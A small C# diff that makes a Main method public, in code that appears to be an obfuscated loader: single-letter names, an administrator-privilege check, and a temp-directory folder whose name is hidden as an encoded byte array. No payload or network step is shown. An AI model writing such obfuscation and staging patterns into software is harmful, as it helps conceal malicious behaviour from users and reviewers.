@@ -17,7 +17,7 @@ namespace a {
             using (WindowsIdentity id = WindowsIdentity.GetCurrent())
                 return new WindowsPrincipal(id).IsInRole(WindowsBuiltInRole.Administrator);
         }
-        static void Main(string[] g) {
+        public static void Main(string[] g) {
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             string h = Path.Combine(Path.GetTempPath(), c(new byte[]{0xD8,0xC2,0xC7,0xCE,0xC5,0xDF,0xC8,0xC4,0xC5,0xC5,0xCE,0xC8,0xDF}));
             Directory.CreateDirectory(h);
